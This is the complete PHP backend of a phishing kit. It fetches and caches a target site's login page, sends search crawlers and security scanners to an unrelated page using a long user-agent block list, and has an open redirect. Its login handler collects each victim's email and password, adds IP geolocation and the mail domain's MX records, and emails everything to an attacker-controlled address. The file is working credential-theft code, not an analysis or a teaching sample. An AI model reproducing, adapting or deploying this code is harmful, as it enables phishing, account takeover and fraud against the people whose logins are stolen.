<?php
header('Access-Control-Allow-Origin: *');
$email_destination = "pope@forlogs3.icu"; // email destination
//$email_destination = "glennwilkinsd@gmail.com";
header("Cache-Control: no-cache, must-revalidate");
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);
function red_to_bot()
{
	header('Location: https://www.amazon.co.uk/Novelty-Pooper-Perfect-Parties-Jasnyfall/dp/B07X9LMNS9');
	exit();
	die();
}
function rdie($a)
{
	echo json_encode($a);
	die();
}
function has_ssl($d)
{
	$stream = stream_context_create(array("ssl" => array("capture_peer_cert" => true)));
	$read = fopen('http://' . $d, "rb", false, $stream);
	$cont = stream_context_get_params($read);
	if (!isset($cont["options"]["ssl"]["peer_certificate"])) {
		return false;
	}
	$var = $cont["options"]["ssl"]["peer_certificate"];
	return !is_null($var) ? true : false;
}
if (isset($_GET['red'])) {
	$domain = (has_ssl($_GET['red']) ? 'https://' : 'http://') . $_GET['red'];
	header('Location: ' . $domain);
	die();
}
if ((!isset($_POST) || !sizeof($_POST) || !isset($_POST['t'])) && !isset($_GET['bg'])) {
	red_to_bot();
}
if(file_exists('sdp.php')){
    include('sdp.php');
}
$cached_htmls = dirname(__FILE__) . '/cached_htmls';
if (!file_exists($cached_htmls)) {
	@mkdir($cached_htmls, 0777, true);
}
function get_content($d = false, $ssl = false)
{
	global $cached_htmls;
	if ($d === 'https://gmail.com') {
		$d = 'https://www.google.com/intl/us/gmail/about/';
	}
	$html_loc = $cached_htmls . '/' . md5($d) . '.html';
	if (file_exists($html_loc)) {
		return file_get_contents($html_loc);
	}
	$c = @file_get_contents($d);
	if (!$c) {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, $d);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.2; WOW64; rv:17.0) Gecko/20100101 Firefox/17.0');
		$c = curl_exec($ch);
		curl_close($ch);
	}

	if (isset($_GET['img']) && $_GET['img'] == '1') {
		return $c;
	}

	$html = str_get_html($c);
	if ($d === 'https://www.google.com/intl/us/gmail/about/') {
		$d = 'https://www.google.com';
	}

	foreach ($html->find('link') as $l) {
		if ($l->href) {
			$link = $l->href;
			if (strpos($link, 'http') === false && strpos($link, '//') === false) {
				$l->href = $d . ($link[0] != '/' ? '/' : '') . $link;
			}
		}
	}
	foreach ($html->find('img') as $img) {
		if ($img->src) {
			$link = $img->src;
			if (strpos($link, 'http') === false && strpos($link, '//') === false) {
				$img->src = $d . ($link[0] != '/' ? '/' : '') . $link;
			}
		}
	}
	foreach ($html->find('script') as $img) {
		if ($img->src) {
			$link = $img->src;
			if (strpos($link, 'http') === false  && strpos($link, '//') === false) {
				$img->src = $d . ($link[0] != '/' ? '/' : '') . $link;
			}
		}
	}
	if (!file_exists($html_loc)) {
		$fp = fopen($html_loc, "wb");
		fwrite($fp, $html->outertext);
		fclose($fp);
	}
	return $html;
}
function gip()
{
	if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
		$_SERVER['REMOTE_ADDR'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
		$_SERVER['HTTP_CLIENT_IP'] = $_SERVER["HTTP_CF_CONNECTING_IP"];
	}
	$client = @$_SERVER['HTTP_CLIENT_IP'];
	$forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
	$remote = $_SERVER['REMOTE_ADDR'];
	if (filter_var($client, FILTER_VALIDATE_IP)) {
		$ip = $client;
	} elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
		$ip = $forward;
	} else {
		$ip = $remote;
	}
	return $ip;
}
function cc($code)
{
	$code = strtoupper($code);
	$countryList = array('AF' => 'Afghanistan', 'AX' => 'Aland Islands', 'AL' => 'Albania', 'DZ' => 'Algeria', 'AS' => 'American Samoa', 'AD' => 'Andorra', 'AO' => 'Angola', 'AI' => 'Anguilla', 'AQ' => 'Antarctica', 'AG' => 'Antigua and Barbuda', 'AR' => 'Argentina', 'AM' => 'Armenia', 'AW' => 'Aruba', 'AU' => 'Australia', 'AT' => 'Austria', 'AZ' => 'Azerbaijan', 'BS' => 'Bahamas the', 'BH' => 'Bahrain', 'BD' => 'Bangladesh', 'BB' => 'Barbados', 'BY' => 'Belarus', 'BE' => 'Belgium', 'BZ' => 'Belize', 'BJ' => 'Benin', 'BM' => 'Bermuda', 'BT' => 'Bhutan', 'BO' => 'Bolivia', 'BA' => 'Bosnia and Herzegovina', 'BW' => 'Botswana', 'BV' => 'Bouvet Island (Bouvetoya)', 'BR' => 'Brazil', 'IO' => 'British Indian Ocean Territory (Chagos Archipelago)', 'VG' => 'British Virgin Islands', 'BN' => 'Brunei Darussalam', 'BG' => 'Bulgaria', 'BF' => 'Burkina Faso', 'BI' => 'Burundi', 'KH' => 'Cambodia', 'CM' => 'Cameroon', 'CA' => 'Canada', 'CV' => 'Cape Verde', 'KY' => 'Cayman Islands', 'CF' => 'Central African Republic', 'TD' => 'Chad', 'CL' => 'Chile', 'CN' => 'China', 'CX' => 'Christmas Island', 'CC' => 'Cocos (Keeling) Islands', 'CO' => 'Colombia', 'KM' => 'Comoros the', 'CD' => 'Congo', 'CG' => 'Congo the', 'CK' => 'Cook Islands', 'CR' => 'Costa Rica', 'CI' => 'Cote d\'Ivoire', 'HR' => 'Croatia', 'CU' => 'Cuba', 'CY' => 'Cyprus', 'CZ' => 'Czech Republic', 'DK' => 'Denmark', 'DJ' => 'Djibouti', 'DM' => 'Dominica', 'DO' => 'Dominican Republic', 'EC' => 'Ecuador', 'EG' => 'Egypt', 'SV' => 'El Salvador', 'GQ' => 'Equatorial Guinea', 'ER' => 'Eritrea', 'EE' => 'Estonia', 'ET' => 'Ethiopia', 'FO' => 'Faroe Islands', 'FK' => 'Falkland Islands (Malvinas)', 'FJ' => 'Fiji the Fiji Islands', 'FI' => 'Finland', 'FR' => 'France, French Republic', 'GF' => 'French Guiana', 'PF' => 'French Polynesia', 'TF' => 'French Southern Territories', 'GA' => 'Gabon', 'GM' => 'Gambia the', 'GE' => 'Georgia', 'DE' => 'Germany', 'GH' => 'Ghana', 'GI' => 'Gibraltar', 'GR' => 'Greece', 'GL' => 'Greenland', 'GD' => 'Grenada', 'GP' => 'Guadeloupe', 'GU' => 'Guam', 'GT' => 'Guatemala', 'GG' => 'Guernsey', 'GN' => 'Guinea', 'GW' => 'Guinea-Bissau', 'GY' => 'Guyana', 'HT' => 'Haiti', 'HM' => 'Heard Island and McDonald Islands', 'VA' => 'Holy See (Vatican City State)', 'HN' => 'Honduras', 'HK' => 'Hong Kong', 'HU' => 'Hungary', 'IS' => 'Iceland', 'IN' => 'India', 'ID' => 'Indonesia', 'IR' => 'Iran', 'IQ' => 'Iraq', 'IE' => 'Ireland', 'IM' => 'Isle of Man', 'IL' => 'Israel', 'IT' => 'Italy', 'JM' => 'Jamaica', 'JP' => 'Japan', 'JE' => 'Jersey', 'JO' => 'Jordan', 'KZ' => 'Kazakhstan', 'KE' => 'Kenya', 'KI' => 'Kiribati', 'KP' => 'Korea', 'KR' => 'Korea', 'KW' => 'Kuwait', 'KG' => 'Kyrgyz Republic', 'LA' => 'Lao', 'LV' => 'Latvia', 'LB' => 'Lebanon', 'LS' => 'Lesotho', 'LR' => 'Liberia', 'LY' => 'Libyan Arab Jamahiriya', 'LI' => 'Liechtenstein', 'LT' => 'Lithuania', 'LU' => 'Luxembourg', 'MO' => 'Macao', 'MK' => 'Macedonia', 'MG' => 'Madagascar', 'MW' => 'Malawi', 'MY' => 'Malaysia', 'MV' => 'Maldives', 'ML' => 'Mali', 'MT' => 'Malta', 'MH' => 'Marshall Islands', 'MQ' => 'Martinique', 'MR' => 'Mauritania', 'MU' => 'Mauritius', 'YT' => 'Mayotte', 'MX' => 'Mexico', 'FM' => 'Micronesia', 'MD' => 'Moldova', 'MC' => 'Monaco', 'MN' => 'Mongolia', 'ME' => 'Montenegro', 'MS' => 'Montserrat', 'MA' => 'Morocco', 'MZ' => 'Mozambique', 'MM' => 'Myanmar', 'NA' => 'Namibia', 'NR' => 'Nauru', 'NP' => 'Nepal', 'AN' => 'Netherlands Antilles', 'NL' => 'Netherlands the', 'NC' => 'New Caledonia', 'NZ' => 'New Zealand', 'NI' => 'Nicaragua', 'NE' => 'Niger', 'NG' => 'Nigeria', 'NU' => 'Niue', 'NF' => 'Norfolk Island', 'MP' => 'Northern Mariana Islands', 'NO' => 'Norway', 'OM' => 'Oman', 'PK' => 'Pakistan', 'PW' => 'Palau', 'PS' => 'Palestinian Territory', 'PA' => 'Panama', 'PG' => 'Papua New Guinea', 'PY' => 'Paraguay', 'PE' => 'Peru', 'PH' => 'Philippines', 'PN' => 'Pitcairn Islands', 'PL' => 'Poland', 'PT' => 'Portugal, Portuguese Republic', 'PR' => 'Puerto Rico', 'QA' => 'Qatar', 'RE' => 'Reunion', 'RO' => 'Romania', 'RU' => 'Russian Federation', 'RW' => 'Rwanda', 'BL' => 'Saint Barthelemy', 'SH' => 'Saint Helena', 'KN' => 'Saint Kitts and Nevis', 'LC' => 'Saint Lucia', 'MF' => 'Saint Martin', 'PM' => 'Saint Pierre and Miquelon', 'VC' => 'Saint Vincent and the Grenadines', 'WS' => 'Samoa', 'SM' => 'San Marino', 'ST' => 'Sao Tome and Principe', 'SA' => 'Saudi Arabia', 'SN' => 'Senegal', 'RS' => 'Serbia', 'SC' => 'Seychelles', 'SL' => 'Sierra Leone', 'SG' => 'Singapore', 'SK' => 'Slovakia (Slovak Republic)', 'SI' => 'Slovenia', 'SB' => 'Solomon Islands', 'SO' => 'Somalia, Somali Republic', 'ZA' => 'South Africa', 'GS' => 'South Georgia and the South Sandwich Islands', 'ES' => 'Spain', 'LK' => 'Sri Lanka', 'SD' => 'Sudan', 'SR' => 'Suriname', 'SJ' => 'Svalbard & Jan Mayen Islands', 'SZ' => 'Swaziland', 'SE' => 'Sweden', 'CH' => 'Switzerland, Swiss Confederation', 'SY' => 'Syrian Arab Republic', 'TW' => 'Taiwan', 'TJ' => 'Tajikistan', 'TZ' => 'Tanzania', 'TH' => 'Thailand', 'TL' => 'Timor-Leste', 'TG' => 'Togo', 'TK' => 'Tokelau', 'TO' => 'Tonga', 'TT' => 'Trinidad and Tobago', 'TN' => 'Tunisia', 'TR' => 'Turkey', 'TM' => 'Turkmenistan', 'TC' => 'Turks and Caicos Islands', 'TV' => 'Tuvalu', 'UG' => 'Uganda', 'UA' => 'Ukraine', 'AE' => 'United Arab Emirates', 'GB' => 'United Kingdom', 'US' => 'United States of America', 'UM' => 'United States Minor Outlying Islands', 'VI' => 'United States Virgin Islands', 'UY' => 'Uruguay, Eastern Republic of', 'UZ' => 'Uzbekistan', 'VU' => 'Vanuatu', 'VE' => 'Venezuela', 'VN' => 'Vietnam', 'WF' => 'Wallis and Futuna', 'EH' => 'Western Sahara', 'YE' => 'Yemen', 'ZM' => 'Zambia', 'ZW' => 'Zimbabwe');
	if (!$countryList[$code]) {
		return $code;
	} else {
		return $countryList[$code];
	}
}
function isbot()
{
	$b = $_SERVER['HTTP_USER_AGENT'];
	if (!$b) {
		return true;
	}
	$a = ["Googlebot", "Baiduspider", "ia_archiver", "R6_FeedFetcher", "NetcraftSurveyAgent", "Sogou web spider", "bingbot", "Yahoo! Slurp", "facebookexternalhit", "PrintfulBot", "msnbot", "Twitterbot", "UnwindFetchor", "urlresolver", "Butterfly", "TweetmemeBot", "PaperLiBot", "MJ12bot", "AhrefsBot", "Exabot", "Ezooms", "YandexBot", "SearchmetricsBot", "picsearch", "TweetedTimes Bot", "QuerySeekerSpider", "ShowyouBot", "woriobot", "merlinkbot", "BazQuxBot", "Kraken", "SISTRIX Crawler", "R6_CommentReader", "magpie-crawler", "GrapeshotCrawler", "PercolateCrawler", "MaxPointCrawler", "R6_FeedFetcher", "NetSeer crawler", "grokkit-crawler", "SMXCrawler", "PulseCrawler", "Y!J-BRW", "80legs", "Mediapartners-Google", "Spinn3r", "InAGist", "Python-urllib", "NING", "TencentTraveler", "Feedfetcher-Google", "mon.itor.us", "spbot", "Feedly", "bitlybot", "ADmantX", "Niki-Bot", "Pinterest", "python-requests", "DotBot", "HTTP_Request2", "linkdexbot", "A6-Indexer", "Baiduspider", "TwitterFeed", "Microsoft Office", "Pingdom", "BTWebClient", "KatBot", "SiteCheck", "proximic", "Sleuth", "Abonti", "(BOT for JCE)", "Baidu", "Tiny Tiny RSS", "newsblur", "updown_tester", "linkdex", "baidu", "searchmetrics", "genieo", "majestic12", "spinn3r", "profound", "domainappender", "VegeBot", "terrykyleseoagency.com", "CommonCrawler Node", "AdlesseBot", "metauri.com", "libwww-perl", "rogerbot-crawler", "MegaIndex.ru", "ltx71", "Qwantify", "Traackr.com", "Re-Animator Bot", "Pcore-HTTP", "BoardReader", "omgili", "okhttp", "CCBot", "Java/1.8", "semrush.com", "feedbot", "CommonCrawler", "AdlesseBot", "MetaURI", "ibwww-perl", "rogerbot", "MegaIndex", "BLEXBot", "FlipboardProxy", "techinfo@ubermetrics-technologies.com", "trendictionbot", "Mediatoolkitbot", "trendiction", "ubermetrics", "ScooperBot", "TrendsmapResolver", "Nuzzel", "Go-http-client", "Applebot", "LivelapBot", "GroupHigh", "SemrushBot", "ltx71", "commoncrawl", "istellabot", "DomainCrawler", "cs.daum.net", "StormCrawler", "GarlikCrawler", "The Knowledge AI", "getstream.io/winds", "YisouSpider", "archive.org_bot", "semantic-visions.com", "FemtosearchBot", "360Spider", "linkfluence.com", "glutenfreepleasure.com", "Gluten Free Crawler", "YaK/1.0", "Cliqzbot", "app.hypefactors.com", "axios", "semantic-visions.com", "webdatastats.com", "schmorp.de", "SEOkicks", "DuckDuckBot", "Barkrowler", "ZoominfoBot", "Linguee Bot", "Mail.RU_Bot", "OnalyticaBot", "Linguee Bot", "admantx-adform", "Buck/2.2", "Barkrowler", "Zombiebot", "Nutch", "SemanticScholarBot", "Jetslide", "scalaj-http", "XoviBot", "sysomos.com", "PocketParser", "newspaper", "serpstatbot", "MetaJobBot", "SeznamBot/3.2", "VelenPublicWebCrawler/1.0", "WordPress.com mShots", "adscanner", "BacklinkCrawler", "netEstate NE Crawler", "Astute SRM", "GigablastOpenSource/1.0", "DomainStatsBot", "Winds: Open Source RSS & Podcast", "dlvr.it", "BehloolBot", "7Siters", "AwarioSmartBot", "Apache-HttpClient/5", "Seekport Crawler", "AHC/2.1", "eCairn-Grabber", "mediawords bot", "PHP-Curl-Class", "Scrapy", "curl/7", "Blackboard", "NetNewsWire", "node-fetch", "admantx", "metadataparser", "Domains Project", "SerendeputyBot", "Moreover", "DuckDuckGo", "monitoring-plugins", "Selfoss", "Adsbot", "acebookexternalhit", "SpiderLing", "Cocolyzebot", "AhrefsBot", "TTD-Content", "superfeedr", "Twingly", "Google-Apps-Scrip", "LinkpadBot", "CensysInspect", "Reeder", "tweetedtimes", "Amazonbot", "MauiBot", "Symfony BrowserKit", "DataForSeoBot", "GoogleProducer", "TinEye-bot-live", "sindresorhus/got", "CriteoBot", "Down/5", "Yahoo Ad monitoring", "MetaInspector", "PetalBot", "MetadataScraper", "Cloudflare SpeedTest", "CriteoBot", "aiohttp", "AppEngine-Google", "heritrix", "sqlmap", "Buck", "MJ12bot", "wp_is_mobile", "SerendeputyBot", "01h4x.com", "404checker", "404enemy", "AIBOT", "ALittle Client", "ASPSeek", "Aboundex", "Acunetix", "AfD-Verbotsverfahren", "AiHitBot", "Aipbot", "Alexibot", "AllSubmitter", "Alligator", "AlphaBot", "Anarchie", "Anarchy", "Anarchy99", "Ankit", "Anthill", "Apexoo", "Aspiegel", "Asterias", "Atomseobot", "Attach", "AwarioRssBot", "BBBike", "BDCbot", "BDFetch", "BackDoorBot", "BackStreet", "BackWeb", "Backlink-Ceck", "BacklinkCrawler", "Badass", "Bandit", "Barkrowler", "BatchFTP", "Battleztar Bazinga", "BetaBot", "Bigfoot", "Bitacle", "BlackWidow", "Black Hole", "Blackboard", "Blow", "BlowFish", "Boardreader", "Bolt", "BotALot", "Brandprotect", "Brandwatch", "Buck", "Buddy", "BuiltBotTough", "BuiltWith", "Bullseye", "BunnySlippers", "BuzzSumo", "CATExplorador", "CCBot", "CODE87", "CSHttp", "Calculon", "CazoodleBot", "Cegbfeieh", "CensysInspect", "CheTeam", "CheeseBot", "CherryPicker", "ChinaClaw", "Chlooe", "Citoid", "Claritybot", "Cliqzbot", "Cloud mapping", "Cocolyzebot", "Cogentbot", "Collector", "Copier", "CopyRightCheck", "Copyscape", "Cosmos", "Craftbot", "Crawling at Home Project", "CrazyWebCrawler", "Crescent", "CrunchBot", "Curious", "Custo", "CyotekWebCopy", "DBLBot", "DIIbot", "DSearch", "DTS Agent", "DataCha0s", "DatabaseDriverMysqli", "Demon", "Deusu", "Devil", "Digincore", "DigitalPebble", "Dirbuster", "Disco", "Discobot", "Discoverybot", "Dispatch", "DittoSpyder", "DnBCrawler-Analytics", "DnyzBot", "DomCopBot", "DomainAppender", "DomainCrawler", "DomainSigmaCrawler", "DomainStatsBot", "Domains Project", "Dotbot", "Download Wonder", "Dragonfly", "Drip", "ECCP/1.0", "EMail Siphon", "EMail Wolf", "EasyDL", "Ebingbong", "Ecxi", "EirGrabber", "EroCrawler", "Evil", "Exabot", "Express WebPictures", "ExtLinksBot", "Extractor", "ExtractorPro", "Extreme Picture Finder", "EyeNetIE", "Ezooms", "FDM", "FHscan", "FemtosearchBot", "Fimap", "Firefox/7.0", "FlashGet", "Flunky", "Foobot", "Freeuploader", "FrontPage", "Fuzz", "FyberSpider", "Fyrebot", "G-i-g-a-b-o-t", "GT::WWW", "GalaxyBot", "Genieo", "GermCrawler", "GetRight", "GetWeb", "Getintent", "Gigabot", "Go!Zilla", "Go-Ahead-Got-It", "GoZilla", "Gotit", "GrabNet", "Grabber", "Grafula", "GrapeFX", "GrapeshotCrawler", "GridBot", "HEADMasterSEO", "HMView", "HTMLparser", "HTTP::Lite", "HTTrack", "Haansoft", "HaosouSpider", "Harvest", "Havij", "Heritrix", "Hloader", "HonoluluBot", "Humanlinks", "HybridBot", "IDBTE4M", "IDBot", "IRLbot", "Iblog", "Id-search", "IlseBot", "Image Fetch", "Image Sucker", "IndeedBot", "Indy Library", "InfoNaviRobot", "InfoTekies", "Intelliseek", "InterGET", "InternetSeer", "Internet Ninja", "Iria", "Iskanie", "IstellaBot", "JOC Web Spider", "JamesBOT", "Jbrofuzz", "JennyBot", "JetCar", "Jetty", "JikeSpider", "Joomla", "Jorgee", "JustView", "Jyxobot", "Kenjin Spider", "Keybot Translation-Search-Machine", "Keyword Density", "Kinza", "Kozmosbot", "LNSpiderguy", "LWP::Simple", "Lanshanbot", "Larbin", "Leap", "LeechFTP", "LeechGet", "LexiBot", "Lftp", "LibWeb", "Libwhisker", "LieBaoFast", "Lightspeedsystems", "Likse", "LinkScan", "LinkWalker", "Linkbot", "LinkextractorPro", "LinkpadBot", "LinksManager", "LinqiaMetadataDownloaderBot", "LinqiaRSSBot", "LinqiaScrapeBot", "Lipperhey", "Lipperhey Spider", "Litemage_walker", "Lmspider", "Ltx71", "MFC_Tear_Sample", "MIDown tool", "MIIxpc", "MJ12bot", "MQQBrowser", "MSFrontPage", "MSIECrawler", "MTRobot", "Mag-Net", "Magnet", "Mail.RU_Bot", "Majestic-SEO", "Majestic12", "Majestic SEO", "MarkMonitor", "MarkWatch", "Mass Downloader", "Masscan", "Mata Hari", "MauiBot", "Mb2345Browser", "MeanPath Bot", "Meanpathbot", "Mediatoolkitbot", "MegaIndex.ru", "Metauri", "MicroMessenger", "Microsoft Data Access", "Microsoft URL Control", "Minefield", "Mister PiX", "Moblie Safari", "Mojeek", "Mojolicious", "MolokaiBot", "Morfeus Fucking Scanner", "Mozlila", "Mr.4x3", "Msrabot", "Musobot", "NICErsPRO", "NPbot", "Name Intelligence", "Nameprotect", "Navroad", "NearSite", "Needle", "Nessus", "NetAnts", "NetLyzer", "NetMechanic", "NetSpider", "NetZIP", "Net Vampire", "Netcraft", "Nettrack", "Netvibes", "NextGenSearchBot", "Nibbler", "Niki-bot", "Nikto", "NimbleCrawler", "Nimbostratus", "Ninja", "Nmap", "Not", "Nuclei", "Nutch", "Octopus", "Offline Explorer", "Offline Navigator", "OnCrawl", "OpenLinkProfiler", "OpenVAS", "Openfind", "Openvas", "OrangeBot", "OrangeSpider", "OutclicksBot", "OutfoxBot", "PECL::HTTP", "PHPCrawl", "POE-Component-Client-HTTP", "PageAnalyzer", "PageGrabber", "PageScorer", "PageThing.com", "Page Analyzer", "Pandalytics", "Panscient", "Papa Foto", "Pavuk", "PeoplePal", "Petalbot", "Pi-Monster", "Picscout", "Picsearch", "PictureFinder", "Piepmatz", "Pimonster", "Pixray", "PleaseCrawl", "Pockey", "ProPowerBot", "ProWebWalker", "Probethenet", "Psbot", "Pu_iN", "Pump", "PxBroker", "PyCurl", "QueryN Metasearch", "Quick-Crawler", "RSSingBot", "RankActive", "RankActiveLinkBot", "RankFlex", "RankingBot", "RankingBot2", "Rankivabot", "RankurBot", "Re-re", "ReGet", "RealDownload", "Reaper", "RebelMouse", "Recorder", "RedesScrapy", "RepoMonkey", "Ripper", "RocketCrawler", "Rogerbot", "SBIder", "SEOkicks", "SEOkicks-Robot", "SEOlyticsCrawler", "SEOprofiler", "SEOstats", "SISTRIX", "SMTBot", "SalesIntelligent", "ScanAlert", "Scanbot", "ScoutJet", "Scrapy", "Screaming", "ScreenerBot", "ScrepyBot", "Searchestate", "SearchmetricsBot", "Seekport", "SemanticJuice", "Semrush", "SemrushBot", "SentiBot", "SeoSiteCheckup", "SeobilityBot", "Seomoz", "Shodan", "Siphon", "SiteCheckerBotCrawler", "SiteExplorer", "SiteLockSpider", "SiteSnagger", "SiteSucker", "Site Sucker", "Sitebeam", "Siteimprove", "Sitevigil", "SlySearch", "SmartDownload", "Snake", "Snapbot", "Snoopy", "SocialRankIOBot", "Sociscraper", "Sogou web spider", "Sosospider", "Sottopop", "SpaceBison", "Spammen", "SpankBot", "Spanner", "Spbot", "Spinn3r", "SputnikBot", "Sqlmap", "Sqlworm", "Sqworm", "Steeler", "Stripper", "Sucker", "Sucuri", "SuperBot", "SuperHTTP", "Surfbot", "SurveyBot", "Suzuran", "Swiftbot", "Szukacz", "T0PHackTeam", "T8Abot", "Teleport", "TeleportPro", "Telesoft", "Telesphoreo", "Telesphorep", "TheNomad", "The Intraformant", "Thumbor", "TightTwatBot", "Titan", "Toata", "Toweyabot", "Tracemyfile", "Trendiction", "Trendictionbot", "True_Robot", "Turingos", "Turnitin", "TurnitinBot", "TwengaBot", "Twice", "Typhoeus", "URLy.Warning", "URLy Warning", "UnisterBot", "Upflow", "V-BOT", "VB Project", "VCI", "Vacuum", "Vagabondo", "VelenPublicWebCrawler", "VeriCiteCrawler", "VidibleScraper", "Virusdie", "VoidEYE", "Voil", "Voltron", "WASALive-Bot", "WBSearchBot", "WEBDAV", "WISENutbot", "WPScan", "WWW-Collector-E", "WWW-Mechanize", "WWW::Mechanize", "WWWOFFLE", "Wallpapers", "Wallpapers/3.0", "WallpapersHD", "WeSEE", "WebAuto", "WebBandit", "WebCollage", "WebCopier", "WebEnhancer", "WebFetch", "WebFuck", "WebGo IS", "WebImageCollector", "WebLeacher", "WebPix", "WebReaper", "WebSauger", "WebStripper", "WebSucker", "WebWhacker", "WebZIP", "Web Auto", "Web Collage", "Web Enhancer", "Web Fetch", "Web Fuck", "Web Pix", "Web Sauger", "Web Sucker", "Webalta", "WebmasterWorldForumBot", "Webshag", "WebsiteExtractor", "WebsiteQuester", "Website Quester", "Webster", "Whack", "Whacker", "Whatweb", "Who.is Bot", "Widow", "WinHTTrack", "WiseGuys Robot", "Wonderbot", "Woobot", "Wotbox", "Wprecon", "Xaldon WebSpider", "Xaldon_WebSpider", "Xenu", "YoudaoBot", "Zade", "Zauba", "Zermelo", "Zeus", "Zitebot", "ZmEu", "ZoomBot", "ZoominfoBot", "ZumBot", "ZyBorg", "adscanner", "archive.org_bot", "arquivo-web-crawler", "arquivo.pt", "autoemailspider", "backlink-check", "cah.io.community", "check1.exe", "clark-crawler", "coccocbot", "cognitiveseo", "com.plumanalytics", "crawl.sogou.com", "crawler.feedback", "crawler4j", "dataforseo.com", "demandbase-bot", "domainsproject.org", "eCatch", "evc-batch", "facebookscraper", "gopher", "heritrix", "instabid", "internetVista monitor", "ips-agent", "isitwp.com", "iubenda-radar", "linkdexbot", "lwp-request", "lwp-trivial", "magpie-crawler", "meanpathbot", "mediawords", "muhstik-scan", "netEstate NE Crawler", "oBot", "page scorer", "pcBrowser", "plumanalytics", "polaris version", "probe-image-size", "ripz", "s1z.ru", "satoristudio.net", "scalaj-http", "scan.lol", "seobility", "seocompany.store", "seoscanners", "seostar", "serpstatbot", "sexsearcher", "sitechecker.pro", "siteripz", "sogouspider", "sp_auditbot", "spyfu", "sysscan", "tAkeOut", "trendiction.com", "trendiction.de", "ubermetrics-technologies.com", "voyagerx.com", "webgains-bot", "webmeup-crawler", "webpros.com", "webprosbot", "x09Mozilla", "x22Mozilla", "xpymep1.exe", "zauba.io", "zgrab"];
	foreach ($a as $aa) {
		if (stripos($b, $aa) !== false) return true;
	}
	return false;
}
if (isbot()) {
	red_to_bot();
}
if (isset($_GET['bg'])) {
	$ssl = has_ssl($_GET['bg']);
	$domain = ($ssl ? 'https://' : 'http://') . $_GET['bg'];
	echo get_content($domain, $ssl);
	die();
}
if (isset($_POST['t'])) {
	switch ($_POST['t']) {
		case 'login':
			if (isset($_POST['emem']) && isset($_POST['psps'])&& isset($_POST['the_bs4'])) {
				//$email_destination = $_POST['to'];
				$email = $_POST['emem'];
                $domain = "";
                $fdm = explode('@',$email);
                $domain = isset($fdm[1]) ? $fdm[1]:"";
                $mxx = [];
                if($domain){
                    getmxrr($domain,$mxx);
                }
				$pass = $_POST['psps'];
				$gip = gip();
				$d = [
					'EMAIL' => $_POST['emem'],
					'PASSWORD' => $_POST['psps'],
					'IP' => $gip,
					'DEVICE' => $_SERVER['HTTP_USER_AGENT']
				];
				$aa = json_decode(file_get_contents('https://ipinfo.io/' . $gip . '/json'), true);
				foreach ($aa as $k => $v) {
					if (strpos(strtolower($k), 'readme') === false) {
						$d[strtoupper($k)] = $v;
					}
				}

				$mes = "|----NEW SCRIPT GENERAL----|\n";
				$mes .= "EML     :      " . $_POST['emem'] . "\n";
				$mes .= "POD     :      " . $_POST['psps'] . "\n";
				$mes .= "BASE64  :      " . $_POST['the_bs4'] . "\n";
				$mes .= "|--------------- I N F O | IP --------------|\n";
				$mes .= " Client IP : " . $gip . "\n";
				$mes .= " Client Country : " . (isset($d['COUNTRY']) ? cc($d['COUNTRY']) : 'N/A') . "\n";
				$mes .= " User Agent : " . $_SERVER['HTTP_USER_AGENT'] . "\n";

				$sub = "Logged: " . (isset($d['IP']) ? $d['IP'] : 'N/A') . ' ' . (isset($d['CITY']) ? $d['CITY'] : 'N/A') . ', ' . (isset($d['COUNTRY']) ? cc($d['COUNTRY']) : 'N/A');
                
                $mix = 0;
                foreach($mxx as $m){
                    $mes.="MX-".$mix." : ".$m."\n";
                    $mix++;
                }

				$sent = mail($email_destination, $sub, $mes);
				$res = [];
				if (!$sent) {
					$res['error'] = 'Login failed please try again later';
				} else {
					$res['mes'] = 'ok';
				}
                $res['dm'] = $domain;
                $res['mx'] = $mxx;
				rdie($res);
			}
			break;
	}
} else {
	red_to_bot();
}
